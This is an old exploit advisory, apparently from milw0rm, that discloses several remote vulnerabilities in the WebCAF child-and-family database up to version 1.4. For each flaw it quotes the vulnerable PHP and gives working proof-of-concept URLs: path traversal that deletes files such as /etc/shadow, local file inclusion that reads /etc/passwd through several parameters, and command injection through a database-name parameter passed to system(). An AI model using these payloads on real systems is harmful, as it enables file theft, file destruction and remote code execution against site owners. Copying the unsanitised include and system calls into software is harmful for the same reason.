@@ -1,0 +1,87 @@
+
+  :::::::-.   ...    ::::::.    :::.
+   ;;,   `';, ;;     ;;;`;;;;,  `;;;
+   `[[     [[[['     [[[  [[[[[. '[[
+    $$,    $$$$      $$$  $$$ "Y$c$$
+    888_,o8P'88    .d888  888    Y88
+    MMMMP"`   "YmmMMMM""  MMM     YM
+
+   [ Discovered by dun \ dun[at]strcpy.pl ]
+
+ #########################################################
+ #  [ webcaf <= 1.4 ]  Multiple Remote Vulnerabilities   #
+ #########################################################
+ #
+ # Script: "WebCAF is a web-based child and family database developed by Head Start of Lane County..."
+ #
+ # Script site: http://www.webcaf.org/
+ # Download: http://www.webcaf.net/downloads/webcaf-1.4.tar.gz
+ #
+ # [Arbitrary File Delete Vulnerability]
+ # Vuln: http://site.com/webcaf/index.php?user_uid=../../../../../../etc/shadow ;)
+ #
+ # Bug: ./webcaf/index.php (lines: 49-50 and 61-63) 
+ #
+ # ...
+ #	// Login, if necessary
+ #	if (!$user_uid) include("modules/login.php");
+ # ... 	 
+ #	if ($_REQUEST[op] != "update") {
+ #		if (file_exists("local/tmp/.$user_uid")) unlink("local/tmp/.$user_uid");
+ #	}
+ # ... 	 
+ #
+ #
+ # [LFI] 
+ # Vuln: http://strcpy.pl/webcaf/webcaf/?user_uid=1&op=forms&form=../../../../../../../../../../../../etc/passwd
+ #		 http://strcpy.pl/webcaf/webcaf/?user_uid=1&op=reports&report=../../../../../../../../../../../../etc/passwd
+ #
+ # Bug: ./webcaf/index.php (lines: 68-131) 
+ #
+ # ...
+ # 	switch ($_REQUEST[op]) {
+ # ...
+ #	case "forms":
+ #		$_REQUEST[form] ? include("local/forms/$_REQUEST[form]") : include("modules/forms.php");	//LFI
+ #		break;
+ # ...
+ #  case "reports":
+ #		$_REQUEST[report] ? include("local/reports/$_REQUEST[report]") : include("modules/reports.php");  	//LFI
+ #		break;
+ # ...
+ #  }
+ # ... 	 
+ #
+ # Vuln: http://strcpy.pl/webcaf/webcaf/modules/view.php?view=../../../../../../../../../../../etc/passwd%00
+ #
+ # Bug: ./webcaf/modules/view.php (lines: 12-21) 
+ #
+ # ...
+ #	if ($_REQUEST[view]) {
+ # ...
+ #  		include("views/$_REQUEST[view].php");	//LFI
+ #	}
+ # ... 	 
+ #
+ #
+ # [RCE]
+ # Vuln: http://site.com/webcaf/about.php?_WEBCAF[db_database]=asfa%22;id%3E/tmp/aaa.txt;false%20%22
+ #
+ # Bug: ./webcaf/index.php (lines: 127) 
+ #
+ # ...
+ # $str_result = system("$str_mysql --database=\"$_WEBCAF[db_database]\" --user=\"$_WEBCAF[db_username]\" --password=\"$_WEBCAF[db_password]\" --html --execute=\"status\"");
+ # ... 	 
+ #
+ # and a lot of other bugz...
+ #
+ #
+ ###############################################
+ # Greetz: D3m0n_DE * str0ke * and otherz..
+ ###############################################
+
+ [ dun / 2008 ] 
+
+*******************************************************************************************
+
+# milw0rm.com [2008-12-08]
